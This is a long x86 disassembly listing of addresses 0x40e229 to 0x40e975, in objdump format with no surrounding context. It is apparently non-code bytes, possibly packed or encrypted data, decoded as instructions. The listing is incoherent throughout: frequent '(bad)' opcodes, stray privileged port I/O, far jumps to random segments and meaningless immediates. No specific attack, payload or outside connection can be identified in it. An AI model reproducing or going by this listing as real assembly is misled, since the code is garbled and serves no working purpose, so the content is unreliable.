  40e229:	sbb    ebx,DWORD PTR [eax]
  40e22b:	int3   
  40e22c:	retf   
  40e22d:	mul    BYTE PTR [edx+0x18]
  40e230:	mov    dh,0xe4
  40e232:	add    al,0x7c
  40e234:	push   ebx
  40e235:	out    dx,al
  40e236:	push   ebp
  40e237:	daa    
  40e238:	ret    0x9cb4
  40e23b:	out    0xe3,eax
  40e23d:	pusha  
  40e23e:	and    BYTE PTR [ecx-0x50],bh
  40e241:	daa    
  40e242:	aad    0x95
  40e244:	arpl   WORD PTR [eax],sp
  40e246:	xor    dl,BYTE PTR [eax-0x7d]
  40e249:	cs out 0x11,al
  40e24c:	jge    0x40e22c
  40e24e:	push   0xd8fa4087
  40e253:	xchg   DWORD PTR [ecx+0x6f],ebx
  40e256:	nop
  40e257:	cmp    ax,0x8788
  40e25b:	pushf  
  40e25c:	mov    ch,0xc8
  40e25e:	push   ebp
  40e25f:	inc    ecx
  40e260:	adc    cl,dh
  40e262:	sub    eax,0x6ddd17db
  40e267:	rol    DWORD PTR [ebp-0x5c279637],cl
  40e26d:	inc    esp
  40e26e:	mov    esp,0x642e1152
  40e273:	or     cl,BYTE PTR [ecx+0x3a9cc360]
  40e279:	repz shl DWORD PTR ds:0xd6ee11b6,0x15
  40e281:	shr    bh,1
  40e283:	push   ebp
  40e284:	push   esi
  40e285:	icebp  
  40e286:	xchg   edi,ebp
  40e288:	loope  0x40e2ef
  40e28a:	and    eax,0x18f138ca
  40e28f:	imul   ecx,DWORD PTR ds:[edi+0x11],0x59
  40e294:	(bad)  
  40e295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e296:	or     esp,edi
  40e298:	dec    ebx
  40e299:	jbe    0x40e297
  40e29b:	push   es
  40e29c:	stos   BYTE PTR es:[edi],al
  40e29d:	ins    BYTE PTR es:[edi],dx
  40e29e:	(bad)  
  40e29f:	adc    BYTE PTR [ebx-0x2c],bl
  40e2a2:	call   0xf9aa4eda
  40e2a7:	mov    eax,ds:0xfa1788dd
  40e2ac:	or     DWORD PTR [edx+0x65],esi
  40e2af:	lods   al,BYTE PTR ds:[esi]
  40e2b0:	out    0xa0,eax
  40e2b2:	xor    eax,0xb3b9d4dd
  40e2b7:	lods   al,BYTE PTR ds:[esi]
  40e2b8:	out    0xf4,eax
  40e2ba:	es sub ah,ch
  40e2bd:	or     bl,BYTE PTR [ecx-0x17b5db2d]
  40e2c3:	cld    
  40e2c4:	mov    ds:0xe1d3213b,eax
  40e2c9:	sahf   
  40e2ca:	fstp   TBYTE PTR [ebp-0x29f731a4]
  40e2d0:	aaa    
  40e2d1:	mov    cl,0xb6
  40e2d3:	fdiv   st(3),st
  40e2d5:	mov    ebp,0x895c7daa
  40e2da:	outs   dx,DWORD PTR ds:[esi]
  40e2db:	dec    ebp
  40e2dc:	outs   dx,BYTE PTR ds:[esi]
  40e2dd:	jecxz  0x40e26a
  40e2df:	mov    cl,0x24
  40e2e1:	ret    
  40e2e2:	enter  0xfff9,0xd0
  40e2e6:	pop    edx
  40e2e7:	int3   
  40e2e8:	mov    ds:0x5f23138a,eax
  40e2ed:	fimul  WORD PTR [ebx+eax*4]
  40e2f0:	pop    ebp
  40e2f1:	inc    esp
  40e2f2:	rcl    DWORD PTR [ecx-0x35e5bc41],0xa5
  40e2f9:	iret   
  40e2fa:	and    BYTE PTR [edi+0x4d],ah
  40e2fd:	sub    eax,0x55b38930
  40e302:	test   al,0xee
  40e304:	aad    0xa7
  40e306:	mul    ch
  40e308:	jmp    0xfcc81a62
  40e30d:	add    al,0x7d
  40e30f:	pop    edx
  40e310:	lock mov bl,0x1a
  40e313:	jnp    0x40e2b4
  40e315:	lods   al,BYTE PTR ds:[esi]
  40e316:	push   edi
  40e317:	or     BYTE PTR [edi],dl
  40e319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e31a:	lods   eax,DWORD PTR ds:[esi]
  40e31b:	and    al,0xb3
  40e31d:	jb     0x40e34b
  40e31f:	push   eax
  40e320:	rol    DWORD PTR [ebx],cl
  40e322:	or     eax,0x2ee2ddcc
  40e327:	outs   dx,DWORD PTR ds:[esi]
  40e328:	cmp    eax,0xca9c2e3d
  40e32d:	shr    DWORD PTR [edx+0x10],0x99
  40e331:	mov    esi,0xeae3fe6a
  40e336:	xchg   esp,eax
  40e337:	leave  
  40e338:	push   esi
  40e339:	push   ecx
  40e33a:	clc    
  40e33b:	icebp  
  40e33c:	(bad)  
  40e33d:	sbb    eax,0xae37d7a1
  40e342:	adc    edi,DWORD PTR [ebp+0x74]
  40e345:	fmulp  st(2),st
  40e347:	xlat   BYTE PTR ds:[ebx]
  40e348:	test   al,0x79
  40e34a:	xor    DWORD PTR [edx],0x11
  40e34d:	loope  0x40e395
  40e34f:	mov    al,ds:0x7e59956a
  40e354:	fiadd  WORD PTR [esi]
  40e356:	or     DWORD PTR [ebx-0x33],edi
  40e359:	shl    DWORD PTR ds:0x58660a51,cl
  40e35f:	cmc    
  40e360:	inc    ebp
  40e361:	xor    ebp,DWORD PTR [ebx+0x42]
  40e364:	mov    eax,ds:0x9847a04a
  40e369:	mov    WORD PTR [eax+esi*8],?
  40e36c:	imul   ecx,DWORD PTR ds:0x9c91721b,0x87657528
  40e376:	jo     0x40e3cf
  40e378:	xor    dh,BYTE PTR [ebp-0x53f841e6]
  40e37e:	outs   dx,DWORD PTR ds:[esi]
  40e37f:	jno    0x40e3b3
  40e381:	lahf   
  40e382:	or     ah,BYTE PTR [ecx]
  40e384:	ins    BYTE PTR es:[edi],dx
  40e385:	and    DWORD PTR [ebx-0x1f6705b5],edx
  40e38b:	out    0x51,eax
  40e38d:	sbb    eax,0x5c09a727
  40e392:	into   
  40e393:	loope  0x40e378
  40e395:	(bad)  
  40e396:	(bad)
  40e399:	icebp  
  40e39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e39c:	sbb    eax,0xaa57fbe2
  40e3a1:	psllw  mm4,QWORD PTR [edx+0x21539db8]
  40e3a8:	stos   DWORD PTR es:[edi],eax
  40e3a9:	ret    0xfaad
  40e3ac:	pop    ss
  40e3ad:	cdq    
  40e3ae:	pop    edx
  40e3af:	jp     0x40e372
  40e3b1:	pop    edx
  40e3b2:	clc    
  40e3b3:	xchg   ecx,eax
  40e3b4:	ja     0x40e42d
  40e3b6:	(bad)  
  40e3b7:	daa    
  40e3b8:	push   ebx
  40e3b9:	ret    0x79a
  40e3bc:	bound  edx,QWORD PTR [edi-0x63]
  40e3bf:	pop    esp
  40e3c0:	sbb    DWORD PTR [ecx-0x3c34f797],ebx
  40e3c6:	pop    ebx
  40e3c7:	(bad)  
  40e3c8:	cli    
  40e3c9:	cld    
  40e3ca:	lahf   
  40e3cb:	inc    eax
  40e3cc:	xchg   edi,eax
  40e3cd:	cs pop eax
  40e3cf:	hlt    
  40e3d0:	shl    BYTE PTR [eax+edi*8-0x7a6f9973],1
  40e3d7:	sbb    DWORD PTR [ecx-0x45788049],esp
  40e3dd:	lds    ebx,FWORD PTR [eax-0x1c870291]
  40e3e3:	(bad)  
  40e3e4:	mov    dh,0x63
  40e3e6:	aaa    
  40e3e7:	pop    edx
  40e3e8:	(bad)  
  40e3e9:	push   0xffffffdc
  40e3eb:	pop    DWORD PTR [eax+0x10f84da7]
  40e3f1:	xchg   ebx,eax
  40e3f2:	push   eax
  40e3f3:	or     DWORD PTR [ecx],edx
  40e3f5:	sub    BYTE PTR [ebp-0x40],bh
  40e3f8:	sub    al,0x96
  40e3fa:	pop    esi
  40e3fb:	push   ebx
  40e3fc:	(bad)  
  40e3fe:	pop    edx
  40e3ff:	xchg   BYTE PTR [ebx+0x5a8dfb1a],cl
  40e405:	(bad)  
  40e406:	mov    DWORD PTR [esi+esi*8+0x24b70ac8],ebx
  40e40d:	mov    cl,0x13
  40e40f:	or     BYTE PTR [esi+0x62],0xc8
  40e413:	fs xchg edx,eax
  40e415:	xor    ebp,0xad0c2023
  40e41b:	int    0x91
  40e41d:	mov    ds:0x3bd454bd,eax
  40e422:	pop    esp
  40e423:	sub    eax,0xe379b0e7
  40e428:	lahf   
  40e429:	gs jno 0x40e487
  40e42c:	cmp    ecx,edx
  40e42e:	pushf  
  40e42f:	sahf   
  40e430:	das    
  40e431:	test   dl,cl
  40e433:	pop    es
  40e434:	inc    eax
  40e435:	xchg   ebx,eax
  40e436:	xor    al,0xfa
  40e438:	retf   
  40e439:	sbb    esi,edx
  40e43b:	(bad)  
  40e43c:	ret    
  40e43d:	je     0x40e464
  40e43f:	or     dh,0xf3
  40e442:	mov    ds:0x166c09e1,eax
  40e447:	xchg   DWORD PTR [edi+0x62],ebx
  40e44a:	push   esi
  40e44b:	inc    eax
  40e44c:	pop    edi
  40e44d:	mov    esi,0x8537eeb3
  40e452:	inc    esp
  40e453:	scas   al,BYTE PTR es:[edi]
  40e454:	cmp    eax,0x57c71cb5
  40e459:	in     al,dx
  40e45a:	stc    
  40e45b:	and    bh,BYTE PTR [edx+0x1f]
  40e45e:	lock push es
  40e460:	sbb    edi,DWORD PTR [edi-0x75c4d20f]
  40e466:	(bad)  
  40e467:	scas   eax,DWORD PTR es:[edi]
  40e468:	jmp    DWORD PTR [ebx-0x361716b0]
  40e46e:	push   0xa0eb5f97
  40e473:	test   edi,esp
  40e475:	jbe    0x40e469
  40e477:	inc    esp
  40e478:	xchg   esp,ebx
  40e47a:	js     0x40e4b8
  40e47c:	sub    BYTE PTR [ebx-0x55fe5714],ch
  40e482:	test   DWORD PTR ds:0x1ab53c92,eax
  40e488:	pop    edx
  40e489:	ins    BYTE PTR es:[edi],dx
  40e48a:	or     eax,0x3959f82b
  40e48f:	fadd   QWORD PTR [esi]
  40e491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e492:	adc    al,0xf1
  40e494:	shl    BYTE PTR [edi-0x3c],1
  40e497:	inc    DWORD PTR [edx+0x27159d54]
  40e49d:	jno    0x40e4c5
  40e49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4a0:	aas    
  40e4a1:	sub    eax,0xbbb28c87
  40e4a6:	sub    ch,al
  40e4a8:	sbb    eax,DWORD PTR [ebx+0x5eec5ac2]
  40e4ae:	sub    al,0xa
  40e4b0:	retf   0x5ef9
  40e4b3:	dec    ecx
  40e4b4:	jb     0x40e4d8
  40e4b6:	popf   
  40e4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4b8:	rol    DWORD PTR [esi+0x76],1
  40e4bb:	cdq    
  40e4bc:	shl    ecx,cl
  40e4be:	jo     0x40e52d
  40e4c0:	or     ebx,0x6700ef6e
  40e4c6:	mov    edi,0x820a6dc7
  40e4cb:	and    eax,0xc603dcce
  40e4d0:	cmp    ch,ch
  40e4d2:	xchg   esp,eax
  40e4d3:	push   es
  40e4d4:	ins    DWORD PTR es:[edi],dx
  40e4d5:	inc    ebx
  40e4d6:	cli    
  40e4d7:	js     0x40e469
  40e4d9:	(bad)
  40e4dd:	lock shl DWORD PTR [ebx+0x4ca178bb],0x82
  40e4e5:	gs dec esi
  40e4e7:	(bad)  
  40e4e8:	fld    st(2)
  40e4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4eb:	add    BYTE PTR [ecx+0x14],dh
  40e4ee:	add    ebx,ecx
  40e4f0:	mov    bh,0xd9
  40e4f2:	cmc    
  40e4f3:	loopne 0x40e4dc
  40e4f5:	push   ss
  40e4f6:	les    edx,FWORD PTR [ebx+ecx*2+0x30]
  40e4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4fb:	icebp  
  40e4fc:	jnp    0x40e4c7
  40e4fe:	neg    ebx
  40e500:	add    edx,ecx
  40e502:	movhps QWORD PTR [ebx+0x35],xmm5
  40e506:	xchg   BYTE PTR [ebx],dh
  40e508:	xchg   esi,eax
  40e509:	or     al,0xaa
  40e50b:	imul   eax,DWORD PTR [edi+esi*1+0x29],0xffffffc0
  40e510:	inc    esp
  40e511:	or     dh,BYTE PTR [eax+0x1]
  40e514:	(bad)  
  40e515:	sbb    DWORD PTR ds:0xddc44985,esi
  40e51b:	(bad)  
  40e51c:	jno    0x40e583
  40e51e:	in     eax,dx
  40e51f:	test   al,0xc5
  40e521:	push   ebx
  40e522:	shr    DWORD PTR [edx-0x47c2ce3e],1
  40e528:	fld    st(5)
  40e52a:	(bad)  
  40e52c:	mov    dh,0xba
  40e52e:	pop    edi
  40e52f:	jbe    0x40e4b9
  40e531:	sub    eax,0xb404636
  40e536:	mov    edx,0x1cdeb682
  40e53b:	mov    dh,0xf0
  40e53d:	push   0xffffffc1
  40e53f:	xchg   ecx,eax
  40e540:	sub    dh,al
  40e542:	repz bts DWORD PTR [edi+0x3c0c81e4],ebx
  40e54a:	inc    ecx
  40e54b:	pop    eax
  40e54c:	mov    DWORD PTR [ebx],eax
  40e54e:	push   ss
  40e54f:	lds    esp,FWORD PTR [esi]
  40e551:	mov    al,dh
  40e553:	pop    edx
  40e554:	jmp    0x6bd4:0xa88fe341
  40e55b:	out    dx,al
  40e55c:	es leave 
  40e55e:	or     BYTE PTR [eax-0x2ae96ce2],0x40
  40e565:	sub    DWORD PTR [ebp+edx*8+0x65],ebx
  40e569:	pop    ebp
  40e56a:	add    dh,dh
  40e56c:	xchg   edi,eax
  40e56d:	xchg   esi,eax
  40e56e:	ins    BYTE PTR es:[edi],dx
  40e56f:	pop    es
  40e570:	popf   
  40e571:	ins    BYTE PTR es:[edi],dx
  40e572:	pop    ecx
  40e573:	mov    bl,BYTE PTR [ebx]
  40e575:	retf   
  40e576:	adc    dh,bl
  40e578:	fsubr  QWORD PTR [edx]
  40e57a:	and    ebx,DWORD PTR [ebp-0x1b1e819b]
  40e580:	sbb    eax,0x470788ee
  40e585:	ret    0xcf83
  40e588:	mov    eax,ds:0xcd5ef577
  40e58d:	inc    ebx
  40e58e:	test   al,0x3c
  40e590:	sbb    dl,BYTE PTR [ecx+0x43c68a46]
  40e596:	mov    dh,0x2e
  40e598:	fadd   QWORD PTR [ebx-0x14]
  40e59b:	inc    edi
  40e59c:	push   edx
  40e59d:	push   eax
  40e59e:	dec    eax
  40e59f:	and    eax,0x2c4041a3
  40e5a4:	sbb    ecx,ebx
  40e5a6:	pushf  
  40e5a7:	clc    
  40e5a8:	mov    ah,0xff
  40e5aa:	jle    0x40e627
  40e5ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5ad:	rol    DWORD PTR [esi+ecx*1+0x5f77ba07],cl
  40e5b4:	ins    BYTE PTR es:[edi],dx
  40e5b5:	test   DWORD PTR [edx+edi*1+0x1d0d7728],edx
  40e5bc:	sub    BYTE PTR [ecx+0x20660df4],dl
  40e5c2:	aam    0x29
  40e5c4:	lahf   
  40e5c5:	mov    esi,0x873d39d8
  40e5ca:	adc    ch,cl
  40e5cc:	inc    ebx
  40e5cd:	mov    dl,BYTE PTR [esi+0x3e]
  40e5d0:	adc    edx,ebp
  40e5d2:	mov    ch,0x15
  40e5d4:	mov    dl,0x81
  40e5d6:	lods   al,BYTE PTR ds:[esi]
  40e5d7:	in     eax,0xfa
  40e5d9:	jg     0x40e5a7
  40e5db:	(bad)  
  40e5dc:	in     eax,0xb4
  40e5de:	icebp  
  40e5df:	daa    
  40e5e0:	icebp  
  40e5e1:	es pop es
  40e5e3:	inc    edi
  40e5e4:	scas   al,BYTE PTR es:[edi]
  40e5e5:	pop    ss
  40e5e6:	add    eax,0x7b369dc1
  40e5eb:	and    BYTE PTR [esi],bh
  40e5ed:	imul   eax,DWORD PTR [edx],0x40
  40e5f0:	cmp    edx,DWORD PTR [esi-0x6d219ce2]
  40e5f6:	(bad)  
  40e5f7:	cdq    
  40e5f8:	jl     0x40e674
  40e5fa:	imul   ebx,DWORD PTR [ebp-0x7f6ff497],0xa599a9d1
  40e604:	mov    ah,0x42
  40e606:	ss int3 
  40e608:	mov    ds:0x6875e988,al
  40e60d:	mov    eax,esp
  40e60f:	rol    DWORD PTR [eax+edi*1],cl
  40e612:	sbb    dh,0xdf
  40e615:	pop    esp
  40e616:	and    eax,0x78440cde
  40e61b:	into   
  40e61c:	dec    edi
  40e61d:	xor    ah,BYTE PTR [esi+0x16]
  40e620:	sar    dl,1
  40e622:	pushf  
  40e623:	sti    
  40e624:	push   0xffffff8e
  40e626:	adc    al,bl
  40e628:	inc    ecx
  40e629:	inc    ebp
  40e62a:	mov    al,ds:0x6efddc8d
  40e62f:	stc    
  40e630:	cdq    
  40e631:	add    bl,BYTE PTR [edx+0x55]
  40e634:	ja     0x40e687
  40e636:	pop    es
  40e637:	push   ds
  40e638:	mov    BYTE PTR [edx-0x502b96c7],dh
  40e63e:	xchg   esi,eax
  40e63f:	pop    es
  40e640:	fdiv   QWORD PTR [ecx+0x1c]
  40e643:	lods   eax,DWORD PTR ds:[esi]
  40e644:	and    bl,al
  40e646:	repz push edx
  40e648:	push   ebp
  40e649:	(bad)  
  40e64a:	adc    edi,edx
  40e64c:	pop    edi
  40e64d:	fisubr WORD PTR [ebp+0x67]
  40e650:	push   ebp
  40e651:	push   cs
  40e652:	or     eax,0xce668435
  40e657:	pop    edx
  40e658:	xchg   ebx,eax
  40e659:	xchg   esp,eax
  40e65a:	mov    WORD PTR [ebx-0x17a1744],es
  40e660:	adc    DWORD PTR [ecx+0x3e08d78e],esp
  40e666:	jbe    0x40e6ca
  40e668:	fisttp QWORD PTR [ebx]
  40e66a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e66b:	push   esp
  40e66c:	mov    al,ds:0x9d5fa0fb
  40e671:	or     esp,esi
  40e673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e674:	aaa    
  40e675:	sbb    dl,BYTE PTR [edx]
  40e677:	(bad)  
  40e678:	sbb    eax,0x8ed4fd86
  40e67d:	push   ebx
  40e67e:	xor    BYTE PTR [ebx-0x78fc4461],0xf6
  40e685:	inc    eax
  40e686:	mov    ds:0x153c4b4c,al
  40e68b:	call   0x67ab:0x852657f4
  40e692:	jp     0x40e69b
  40e694:	lahf   
  40e695:	pop    es
  40e696:	popa   
  40e697:	rol    bl,1
  40e699:	(bad)  
  40e69a:	and    ah,BYTE PTR [eax+eiz*2+0x759a5caa]
  40e6a1:	jo     0x40e674
  40e6a3:	add    al,0x65
  40e6a5:	add    BYTE PTR [ebx+ebp*4+0x296bd251],0x28
  40e6ad:	xchg   ecx,eax
  40e6ae:	mov    esp,0x8a2c58ac
  40e6b3:	push   cs
  40e6b4:	sub    al,0x41
  40e6b6:	sbb    DWORD PTR [ecx+edi*1-0x7fd14893],esp
  40e6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6be:	xchg   ebp,eax
  40e6bf:	inc    esp
  40e6c0:	jns    0x40e6c1
  40e6c2:	stos   BYTE PTR es:[edi],al
  40e6c3:	mov    ebx,0x4731e2a7
  40e6c8:	jge    0x40e6d5
  40e6ca:	mov    ds:0x5ce3402d,eax
  40e6cf:	iret   
  40e6d0:	daa    
  40e6d1:	jmp    0xcd21:0x2bf4645e
  40e6d8:	mov    bh,0xc1
  40e6da:	inc    edi
  40e6db:	inc    ebp
  40e6dc:	in     al,dx
  40e6dd:	pop    ds
  40e6de:	xchg   edx,eax
  40e6df:	push   cs
  40e6e0:	in     al,0x32
  40e6e2:	or     BYTE PTR [esi-0x2e],ch
  40e6e5:	cwde   
  40e6e6:	in     eax,dx
  40e6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6e8:	mov    ss,WORD PTR [edx]
  40e6ea:	cmc    
  40e6eb:	in     al,0xec
  40e6ed:	scas   eax,DWORD PTR es:[edi]
  40e6ee:	jl     0x40e715
  40e6f0:	mov    al,0xc5
  40e6f2:	mov    ds:0x651204f7,al
  40e6f7:	sar    DWORD PTR [eax],cl
  40e6f9:	adc    BYTE PTR [esi],al
  40e6fb:	fmul   QWORD PTR [ebx]
  40e6fd:	push   edi
  40e6fe:	jl     0x40e6a5
  40e700:	xchg   edx,eax
  40e701:	sbb    BYTE PTR [ebx],al
  40e703:	cmp    ebp,eax
  40e705:	or     al,0x5f
  40e707:	das    
  40e708:	clc    
  40e709:	fwait
  40e70a:	inc    esp
  40e70b:	xor    dl,BYTE PTR [eax]
  40e70d:	jmp    0x303cdf78
  40e712:	mov    fs,WORD PTR [edi-0x4bf56846]
  40e718:	pop    es
  40e719:	inc    esi
  40e71a:	(bad)
  40e71d:	lods   eax,DWORD PTR ds:[esi]
  40e71e:	push   es
  40e71f:	push   0x408133d9
  40e724:	nop
  40e725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e726:	retf   0x18b3
  40e729:	add    BYTE PTR [edi*1+0x6baba47a],cl
  40e730:	mov    bl,0xb9
  40e732:	xor    ch,al
  40e734:	repz cwde 
  40e736:	mov    ds:0x14a7b441,al
  40e73b:	pop    ecx
  40e73c:	cmp    ecx,esi
  40e73e:	pop    eax
  40e73f:	cmp    BYTE PTR [ecx+0x25b337a4],dl
  40e745:	push   edi
  40e746:	xchg   ecx,eax
  40e747:	in     eax,dx
  40e748:	dec    esi
  40e749:	adc    cl,BYTE PTR [edi]
  40e74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e74c:	pop    edx
  40e74d:	nop
  40e74e:	dec    ebx
  40e74f:	adc    al,BYTE PTR [eax-0x1b]
  40e752:	inc    edi
  40e753:	lods   eax,DWORD PTR ds:[esi]
  40e754:	mov    ch,0x54
  40e756:	fwait
  40e757:	pop    edx
  40e758:	sub    al,0x69
  40e75a:	ror    BYTE PTR [ebx+0x7b30d2d5],0x1b
  40e761:	add    bh,al
  40e763:	lods   al,BYTE PTR ds:[esi]
  40e764:	xchg   di,ax
  40e766:	ret    
  40e767:	(bad)
  40e76b:	dec    ebp
  40e76c:	push   esp
  40e76d:	jnp    0x40e71c
  40e76f:	rcr    esp,1
  40e771:	dec    eax
  40e772:	mov    eax,ds:0xf898556e
  40e777:	and    BYTE PTR [eax+0x74],ch
  40e77a:	addr16 push 0xffffffdf
  40e77d:	mov    ds,WORD PTR [ecx+edi*1+0x6f]
  40e781:	out    0x2a,al
  40e783:	ret    
  40e784:	mov    ecx,0x61534d31
  40e789:	xchg   ebp,eax
  40e78a:	xchg   DWORD PTR [esi+0x52aabbe],ebx
  40e790:	cli    
  40e791:	dec    ebx
  40e792:	adc    al,0x1f
  40e794:	or     al,0x1a
  40e796:	rol    BYTE PTR [edx],1
  40e798:	inc    edi
  40e799:	outs   dx,DWORD PTR ds:[esi]
  40e79a:	out    dx,eax
  40e79b:	(bad)  
  40e79c:	xor    edx,eax
  40e79e:	ss push 0xffffffc5
  40e7a1:	pushw  ds
  40e7a3:	and    dh,BYTE PTR [edx+ebp*2]
  40e7a6:	inc    esp
  40e7a7:	add    eax,0x5633c25f
  40e7ac:	jne    0x40e798
  40e7ae:	in     eax,dx
  40e7af:	imul   DWORD PTR [edi]
  40e7b1:	sbb    eax,ecx
  40e7b3:	mov    cl,0x39
  40e7b5:	jge    0x40e7cc
  40e7b7:	xor    BYTE PTR [ebx],cl
  40e7b9:	jo     0x40e836
  40e7bb:	ins    BYTE PTR es:[edi],dx
  40e7bc:	dec    esi
  40e7bd:	push   0x1b
  40e7bf:	xchg   ebp,eax
  40e7c0:	jo     0x40e7b9
  40e7c2:	mov    ecx,0x1fa16699
  40e7c7:	xchg   esi,eax
  40e7c8:	mov    ebx,0x4bddfe9a
  40e7cd:	retf   
  40e7ce:	je     0x40e7c7
  40e7d0:	sbb    DWORD PTR [edx+0x765270aa],edi
  40e7d6:	in     al,0x98
  40e7d8:	aam    0x13
  40e7da:	or     ecx,DWORD PTR [edx+0x10c0dda4]
  40e7e0:	push   0xd7238da6
  40e7e5:	imul   edx,DWORD PTR [ebp+0x5703f3d9],0xcdf42227
  40e7ef:	fwait
  40e7f0:	or     al,0x47
  40e7f2:	dec    ebp
  40e7f3:	jecxz  0x40e84d
  40e7f5:	cmp    al,0x1b
  40e7f7:	cmp    eax,0x493669a4
  40e7fc:	inc    esi
  40e7fd:	push   es
  40e7fe:	fwait
  40e7ff:	ins    DWORD PTR es:[edi],dx
  40e800:	push   cs
  40e801:	add    eax,0x15cb28e
  40e806:	(bad)  
  40e807:	sti    
  40e808:	pop    es
  40e809:	cmp    ebp,DWORD PTR ds:[esi+eiz*8+0x7380da66]
  40e811:	repnz repnz adc ebp,esi
  40e815:	jae    0x40e7bd
  40e817:	mov    ecx,0x2e20a1e8
  40e81c:	mov    cx,0x65d9
  40e820:	scas   al,BYTE PTR es:[edi]
  40e821:	stc    
  40e822:	imul   esp,DWORD PTR [ecx+0x3fafb5b1],0x147a6d22
  40e82c:	clc    
  40e82d:	mov    ebx,0xeed2651d
  40e832:	stos   DWORD PTR es:[edi],eax
  40e833:	adc    DWORD PTR [ecx+0x23],0xb8977638
  40e83a:	popf   
  40e83b:	xchg   edi,eax
  40e83c:	jbe    0x40e7f7
  40e83e:	aaa    
  40e83f:	inc    edi
  40e840:	or     BYTE PTR [edi],ch
  40e842:	fist   WORD PTR [eax]
  40e844:	std    
  40e845:	(bad)  
  40e846:	fisubr WORD PTR ds:0xd64dc997
  40e84c:	push   ds
  40e84d:	retf   
  40e84e:	jle    0x40e810
  40e850:	stos   DWORD PTR es:[edi],eax
  40e851:	rcl    DWORD PTR [ebp-0x1d],1
  40e854:	call   0x60c404e1
  40e859:	pop    esp
  40e85a:	iret   
  40e85b:	pusha  
  40e85c:	fst    QWORD PTR [ebp-0x12f56cd7]
  40e862:	repnz es cmp ebp,esi
  40e866:	daa    
  40e867:	sub    BYTE PTR [ecx+0x79776b0f],ch
  40e86d:	and    DWORD PTR [esi+0x6dcc4843],ebx
  40e873:	repz mov bh,0x84
  40e876:	call   0xa9d9:0x645a056c
  40e87d:	xchg   ebx,eax
  40e87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e87f:	imul   esi,DWORD PTR [esi-0x40c43708],0xd
  40e886:	mov    eax,0xb483b62c
  40e88b:	mov    eax,0xe28c706b
  40e890:	sub    DWORD PTR [esi-0x22c08da1],esp
  40e896:	adc    ebp,DWORD PTR [ebp-0x2a04cb97]
  40e89c:	cdq    
  40e89d:	aaa    
  40e89e:	adc    esp,DWORD PTR [eax]
  40e8a0:	jnp    0x40e8e1
  40e8a2:	out    dx,eax
  40e8a3:	out    dx,al
  40e8a4:	lods   eax,DWORD PTR ds:[esi]
  40e8a5:	lock sub dl,BYTE PTR [ebp-0x739d35be]
  40e8ac:	clc    
  40e8ad:	sar    DWORD PTR [esi+edx*8],0xaf
  40e8b1:	out    dx,al
  40e8b2:	xchg   edi,eax
  40e8b3:	sbb    BYTE PTR es:[eax],ah
  40e8b6:	and    cl,BYTE PTR [ebx]
  40e8b8:	jns    0x40e8d4
  40e8ba:	xor    BYTE PTR [ebx],cl
  40e8bc:	ret    0x4172
  40e8bf:	rol    DWORD PTR [ebx-0x67],1
  40e8c2:	shl    dl,1
  40e8c4:	popa   
  40e8c5:	ins    DWORD PTR es:[edi],dx
  40e8c6:	test   eax,0x681df9d4
  40e8cb:	lahf   
  40e8cc:	dec    ebp
  40e8cd:	add    DWORD PTR [eax],esi
  40e8cf:	mov    esp,0x88c458
  40e8d4:	(bad)  
  40e8d5:	mov    ah,0x96
  40e8d7:	pushf  
  40e8d8:	aaa    
  40e8d9:	lods   eax,DWORD PTR ds:[esi]
  40e8da:	(bad)  
  40e8db:	dec    ebx
  40e8dc:	fs jg  0x40e897
  40e8df:	xchg   ebp,eax
  40e8e0:	or     eax,0xf259cc9
  40e8e5:	repnz scas eax,DWORD PTR es:[edi]
  40e8e7:	(bad)  
  40e8e9:	rcl    DWORD PTR [ebx],1
  40e8eb:	jno    0x40e8a3
  40e8ed:	mov    bl,0x4c
  40e8ef:	push   edi
  40e8f0:	push   esp
  40e8f1:	call   0x89633b01
  40e8f6:	push   eax
  40e8f7:	cmp    eax,0x65b249bc
  40e8fc:	jno    0x40e95c
  40e8fe:	adc    DWORD PTR [ebx+0x2da64f20],ecx
  40e904:	sahf   
  40e905:	or     cl,BYTE PTR [edi+0x55]
  40e908:	and    esi,DWORD PTR [ecx]
  40e90a:	mov    dl,0xb
  40e90c:	mov    al,ds:0x83aadc4a
  40e911:	and    ah,0x7
  40e914:	pushf  
  40e915:	mov    edx,0xa804ca1b
  40e91a:	jo     0x40e93c
  40e91c:	mov    ds:0x61e3b7f8,al
  40e921:	not    DWORD PTR [esi+0x4b]
  40e924:	cmp    eax,0x7f0986b0
  40e929:	sub    eax,0xbec25588
  40e92e:	adc    eax,0xa8f141d1
  40e933:	cmp    BYTE PTR [eax-0x18f7da71],al
  40e939:	pop    ebp
  40e93a:	add    al,0x9e
  40e93c:	jecxz  0x40e8c6
  40e93e:	retf   
  40e93f:	xor    DWORD PTR [eax],edx
  40e941:	in     eax,0xab
  40e943:	mov    ecx,0xc52d3055
  40e948:	ins    BYTE PTR es:[edi],dx
  40e949:	pop    esi
  40e94a:	mov    bh,0x3c
  40e94c:	aas    
  40e94d:	ins    DWORD PTR es:[edi],dx
  40e94e:	cmp    eax,0xb0f06d0
  40e953:	rol    eax,0x51
  40e956:	mov    ecx,0x6fb09c01
  40e95b:	(bad)  
  40e95c:	div    BYTE PTR [ebp-0x38]
  40e95f:	repz inc ebp
  40e961:	loop   0x40e9b9
  40e963:	pop    ebp
  40e964:	(bad)  
  40e965:	fsubr  DWORD PTR [eax-0x791557e9]
  40e96b:	popa   
  40e96c:	dec    esp
  40e96d:	cmp    BYTE PTR [ebx+0x11],ch
  40e970:	es loopne 0x40e922
  40e973:	sbb    BYTE PTR [eax],ah
  40e975:	pop    edx
